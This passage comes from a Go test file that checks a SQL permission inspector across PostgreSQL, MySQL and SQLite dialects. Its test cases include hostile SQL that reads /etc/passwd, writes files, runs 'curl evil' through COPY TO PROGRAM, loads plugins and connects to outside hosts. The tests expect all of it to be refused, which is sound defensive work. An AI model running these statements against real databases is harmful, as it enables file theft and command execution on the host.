		"SELECT * FROM (SELECT c1 FROM t1) t3 JOIN other.t3 ON 1=1",
		"SELECT other.t3.c4 FROM (SELECT c1 FROM t1) t3, other.t3",
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), sql)
				if !testutil.Touches(inspected, want) {
					t.Errorf("no read of other.t3 anywhere in %+v", inspected)
				}
			})
		}
	}
}

// TestPermissions_ANestedAliasStaysInsideItsQuery is the other half of walking
// a nested statement. A name a subquery declares is in scope only inside it, so
// carrying it outward left a table resolving to no schema, and PostgreSQL
// refused a derived table nested in another for every role.
func TestPermissions_ANestedAliasStaysInsideItsQuery(t *testing.T) {
	for _, sql := range []string{
		"SELECT * FROM (SELECT c1 FROM (SELECT c1 FROM t1) y) x",
		"SELECT * FROM (SELECT c1 FROM (SELECT c1 FROM t1) y, t2) x",
		"SELECT * FROM (SELECT c1 FROM (SELECT c1 FROM t1) y JOIN t2 ON 1=1) x",
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), sql)
				if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t1"}) {
					t.Fatalf("no read of main.t1, so nothing here was checked: %+v", inspected)
				}
				if name := unresolvedTable(inspected); name != "" {
					t.Errorf("%q is a name a subquery declares, reported as a table: %+v", name, inspected)
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, dataActionsOnly()); err != nil {
					t.Errorf("ordinary work refused: %v", err)
				}
			})
		}
	}
}

// TestPermissions_EveryNestedReadIsReported pins the statements whose inner
// read never reached the result at all, so the check had nothing to refuse.
// A derived table joined rather than comma-listed lost its whole body on
// SQLite, and a WITH clause on an UPDATE or a DELETE was read by neither MySQL
// inspector nor, for DELETE, the SQLite one.
func TestPermissions_EveryNestedReadIsReported(t *testing.T) {
	const s = "main"
	read := testutil.Touch{Op: core.InspectOpSelect, Schema: s, Name: "t1"}

	for _, tt := range []struct {
		sql   string
		needs []tableGrant
	}{
		{"SELECT * FROM (SELECT c1 FROM t1) x JOIN t2 ON x.c1 = t2.c1",
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionSelect}}},
		{"SELECT * FROM t2 JOIN (SELECT c1 FROM t1) x ON x.c1 = t2.c1",
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionSelect}}},
		{"SELECT * FROM (SELECT c1 FROM t1) x LEFT JOIN t2 ON x.c1 = t2.c1",
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionSelect}}},
		{"WITH x AS (SELECT c1 FROM t1) UPDATE t2 SET c3 = 'x'",
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionUpdate}}},
		{"WITH x AS (SELECT c1 FROM t1) DELETE FROM t2",
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionDelete}}},
		// A WHERE clause is collected after the CTE bodies, so assigning its
		// subqueries rather than appending them threw the bodies away.
		{"WITH x AS (SELECT c1 FROM t1) DELETE FROM t2 WHERE c1 > 0",
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionDelete}}},
		{"WITH x AS (SELECT c1 FROM t1) UPDATE t2 SET c3 = 'x' WHERE c1 > 0",
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionUpdate}}},
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+tt.sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), tt.sql)
				if !testutil.Touches(inspected, read) {
					t.Fatalf("no read of main.t1, so the check had nothing to refuse: %+v", inspected)
				}

				for idx, missing := range tt.needs {
					rest := slices.Delete(slices.Clone(tt.needs), idx, idx+1)
					if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(rest...)); err == nil {
						t.Errorf("ran without %s on %s.%s", missing.action, missing.schema, missing.table)
					}
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(tt.needs...)); err != nil {
					t.Errorf("holding %v still refused it: %v", tt.needs, err)
				}
			})
		}
	}
}

// TestPermissions_AWriteNamingNoTableIsRefused pins the write whose target did
// not resolve. It named no table, so the per-table walk had nothing to iterate
// and the statement ran on a policy granting nothing at all. PostgreSQL reached
// it by dereferencing a target its grammar never produces, which panicked.
//
// SQLite owns this spelling and resolves it, so it is pinned separately below:
// asserting a refusal there would only be asserting that deny-all refuses.
func TestPermissions_AWriteNamingNoTableIsRefused(t *testing.T) {
	nothing := core.Compile(nil).WithDenyUnmanaged()

	for _, sql := range []string{
		"INSERT OR REPLACE INTO t1 VALUES (1, 'a')",
		"INSERT OR IGNORE INTO t1 VALUES (1, 'a')",
	} {
		for _, dialect := range []string{"postgresql", "mysql"} {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				var inspected []core.InspectStatement
				func() {
					defer func() {
						if r := recover(); r != nil {
							t.Fatalf("inspecting panicked, which fails the request rather than refusing it: %v", r)
						}
					}()
					inspected = Inspect(GetDialect(dialect), permMeta(), sql)
				}()
				if len(inspected) == 0 {
					t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, nothing); err == nil {
					t.Error("ran on a policy granting nothing")
				}
			})
		}
	}
}

// The same spelling on the dialect that owns it still resolves to its table and
// needs exactly insert, so refusing it everywhere was never the fix.
func TestPermissions_SQLiteStillReadsItsOwnUpsert(t *testing.T) {
	for _, sql := range []string{
		"INSERT OR REPLACE INTO t1 VALUES (1, 'a')",
		"INSERT OR IGNORE INTO t1 VALUES (1, 'a')",
	} {
		t.Run(sql, func(t *testing.T) {
			inspected := Inspect(GetDialect("sqlite"), permMeta(), sql)
			if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpInsert, Schema: "main", Name: "t1"}) {
				t.Fatalf("no insert on main.t1 reported: %+v", inspected)
			}
			if err := core.CheckQueryPermissions(inspected, permDBID, holding(core.ActionSelect)); err == nil {
				t.Error("ran holding select alone")
			}
			if err := core.CheckQueryPermissions(inspected, permDBID, holding(core.ActionInsert)); err != nil {
				t.Errorf("holding insert still refused it: %v", err)
			}
		})
	}
}

// TestPermissions_ATruncatedWriteNeverRunsUnchecked pins the writes that name
// no table because the statement stops before naming one. checkTables iterates
// the tables a statement names, so it iterated nothing and the statement ran on
// a policy granting nothing. Every dialect produced the same outcome for these,
// and PostgreSQL and MySQL reached some of them by dereferencing a node error
// recovery left incomplete, which fails the request rather than refusing it.
func TestPermissions_ATruncatedWriteNeverRunsUnchecked(t *testing.T) {
	nothing := core.Compile(nil).WithDenyUnmanaged()

	for _, sql := range []string{
		"DELETE",
		"DELETE FROM",
		"UPDATE",
		"UPDATE SET c1 = 1",
		"INSERT",
		"INSERT INTO",
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				var inspected []core.InspectStatement
				func() {
					defer func() {
						if r := recover(); r != nil {
							t.Fatalf("inspecting panicked: %v", r)
						}
					}()
					inspected = Inspect(GetDialect(dialect), permMeta(), sql)
				}()
				if len(inspected) == 0 {
					t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, nothing); err == nil {
					t.Error("ran on a policy granting nothing")
				}
			})
		}
	}
}

// TestPermissions_SelectIntoIsNotJustASelect pins the two spellings that build
// something while looking like a read. Both used to run holding select alone.
func TestPermissions_SelectIntoIsNotJustASelect(t *testing.T) {
	for _, tt := range []struct {
		dialect string
		sql     string
		needs   []string
	}{
		{"postgresql", "SELECT c1 INTO t9 FROM t1", []string{core.ActionManage, core.ActionSelect}},
		{"postgresql", "SELECT c1 INTO TEMP t9 FROM t1", []string{core.ActionManage, core.ActionSelect}},
		{"mysql", "SELECT c1 INTO OUTFILE '/tmp/x' FROM t1", []string{core.ActionManage, core.ActionSelect}},
		{"mysql", "SELECT c1 INTO DUMPFILE '/tmp/x' FROM t1", []string{core.ActionManage, core.ActionSelect}},
		// The INTO trails the query here, which is the documented spelling and
		// reaches a different grammar node than the one above.
		{"mysql", "SELECT c1 FROM t1 INTO OUTFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
		{"mysql", "SELECT c1 FROM t1 INTO DUMPFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
		{"mysql", "(SELECT c1 FROM t1) INTO OUTFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
		// One branch of a union carries it, and that branch is parenthesised,
		// so walking the branches by shape missed it.
		{"mysql", "(SELECT c1 FROM t1) UNION (SELECT c1 INTO OUTFILE '/tmp/x' FROM t1)", []string{core.ActionManage, core.ActionSelect}},
		{"postgresql", "SELECT c1 INTO TEMPORARY t9 FROM t1", []string{core.ActionManage, core.ActionSelect}},
		// A locking clause after the INTO is the spelling MySQL documents since
		// 8.0.20. It raises a syntax error in this grammar and error recovery
		// drops the tail, so there is no clause left in the tree to find.
		{"mysql", "SELECT c1 FROM t1 FOR UPDATE INTO OUTFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
		{"mysql", "SELECT c1 FROM t1 LOCK IN SHARE MODE INTO OUTFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
		{"mysql", "SELECT c1 FROM t1 FOR UPDATE INTO DUMPFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
		// A locking clause on its own is still a plain read.
		{"mysql", "SELECT c1 FROM t1 FOR UPDATE", []string{core.ActionSelect}},
		// Writes nothing, so it stays a plain read.
		{"mysql", "SELECT c1 INTO @v FROM t1", []string{core.ActionSelect}},
	} {
		t.Run(tt.dialect+": "+tt.sql, func(t *testing.T) {
			inspected := Inspect(GetDialect(tt.dialect), permMeta(), tt.sql)
			if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t1"}) {
				t.Fatalf("no read of main.t1, so nothing here was checked: %+v", inspected)
			}

			for idx, missing := range tt.needs {
				rest := slices.Delete(slices.Clone(tt.needs), idx, idx+1)
				if err := core.CheckQueryPermissions(inspected, permDBID, holding(rest...)); err == nil {
					t.Errorf("ran without %q", missing)
				}
			}
			if err := core.CheckQueryPermissions(inspected, permDBID, holding(tt.needs...)); err != nil {
				t.Errorf("holding %v still refused it: %v", tt.needs, err)
			}
		})
	}
}

// dialectSQL is one statement and the dialect it is written in.
type dialectSQL struct {
	dialect string
	sql     string
}

// TestPermissions_ReachingTheServerNeedsManage pins the statements that touch
// the host: its filesystem, its shell, another server. The four row actions
// cover rows, so none of these may run on them. The database gates most of
// these separately, on a superuser or the FILE privilege or a loaded extension,
// but that is the database's gate and not this one: the credentials a
// proxified connection holds are often privileged enough.
func TestPermissions_ReachingTheServerNeedsManage(t *testing.T) {
	dataActions := dataActionsOnly()

	for _, tt := range []dialectSQL{
		// Statement-shaped.
		{"postgresql", "COPY t1 TO '/tmp/x.csv'"},
		{"postgresql", "COPY t1 TO PROGRAM 'curl evil'"},
		{"postgresql", "CREATE TABLESPACE ts LOCATION '/tmp/ts'"},
		{"postgresql", "ALTER SYSTEM SET log_directory = '/tmp'"},
		{"mysql", "LOAD DATA INFILE '/tmp/x' INTO TABLE t1"},
		{"mysql", "LOAD XML INFILE '/tmp/x' INTO TABLE t1"},
		{"mysql", "INSTALL PLUGIN x SONAME 'evil.so'"},
		{"sqlite", "ATTACH DATABASE '/tmp/evil.db' AS e"},
		{"sqlite", "VACUUM INTO '/tmp/x.db'"},

		// Call-shaped, and these look like a plain read from the outside.
		{"postgresql", "SELECT pg_read_file('/etc/passwd')"},
		{"postgresql", "SELECT pg_ls_dir('/etc')"},
		{"postgresql", "SELECT lo_export(1, '/tmp/x')"},
		{"postgresql", "SELECT dblink_connect('host=evil')"},
		{"postgresql", "SELECT * FROM t1 WHERE c2 = pg_read_file('/etc/passwd')"},
		{"postgresql", "UPDATE t1 SET c2 = pg_read_file('/etc/passwd')"},
		{"postgresql", "SELECT (SELECT pg_read_file('/etc/passwd'))"},
		{"mysql", "SELECT LOAD_FILE('/etc/passwd')"},
		{"mysql", "INSERT INTO t1 (c2) VALUES (LOAD_FILE('/etc/passwd'))"},
		{"sqlite", "SELECT writefile('/tmp/x', 'data')"},
		{"sqlite", "SELECT * FROM t1 WHERE c2 = readfile('/etc/passwd')"},
		{"sqlite", "UPDATE t1 SET c2 = writefile('/tmp/x','y')"},
	} {
		t.Run(tt.dialect+": "+tt.sql, func(t *testing.T) {
			inspected := Inspect(GetDialect(tt.dialect), permMeta(), tt.sql)
			if len(inspected) == 0 {
				t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
			}
			err := core.CheckQueryPermissions(inspected, permDBID, dataActions)
			if err == nil {
				t.Fatal("ran holding the four row actions")
			}
			if !strings.Contains(err.Error(), "manage") {
				t.Errorf("refused for the wrong reason: %v", err)
			}
		})
	}
}

// The name of one of those routines is not the call, so a column or an alias
// spelled like one is still ordinary work.
func TestPermissions_AHostFunctionNameIsNotACall(t *testing.T) {
	dataActions := dataActionsOnly()

	for _, tt := range []dialectSQL{
		{"postgresql", "SELECT c1 AS pg_read_file FROM t1"},
		{"postgresql", "SELECT c1 FROM t1 ORDER BY pg_read_file"},
		{"mysql", "SELECT c1 AS load_file FROM t1"},
		{"mysql", "SELECT c1 FROM t1 WHERE c2 = 'load_file('"},
		{"sqlite", "SELECT c1 AS readfile FROM t1"},
		{"sqlite", "SELECT c1 FROM t1 WHERE c2 = 'writefile'"},
	} {
		t.Run(tt.dialect+": "+tt.sql, func(t *testing.T) {
			inspected := Inspect(GetDialect(tt.dialect), permMeta(), tt.sql)
			if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t1"}) {
				t.Fatalf("no read of main.t1, so nothing here was checked: %+v", inspected)
			}
			if err := core.CheckQueryPermissions(inspected, permDBID, dataActions); err != nil {
				t.Errorf("ordinary work refused: %v", err)
			}
		})
	}
}

// One statement calling such a routine must not drag the rest of a script with
// it, nor be excused by them.
func TestPermissions_AScriptIsClassifiedStatementByStatement(t *testing.T) {
	dataActions := dataActionsOnly()

	for _, tt := range []dialectSQL{
		{"postgresql", "SELECT pg_read_file('/etc/passwd'); SELECT c1 FROM t1"},
		{"mysql", "SELECT LOAD_FILE('/etc/passwd'); SELECT c1 FROM t1"},
	} {
		t.Run(tt.dialect, func(t *testing.T) {
			inspected := Inspect(GetDialect(tt.dialect), permMeta(), tt.sql)
			unknown := 0
			for _, stmt := range inspected {
				if stmt.Operation == core.InspectOpUnknown {
					unknown++
				}
			}
			if unknown != 1 {
				t.Errorf("%d statements need manage, want 1: %+v", unknown, inspected)
			}
			if err := core.CheckQueryPermissions(inspected, permDBID, dataActions); err == nil {
				t.Error("the calling statement ran on the four row actions")
			}
		})
	}
}
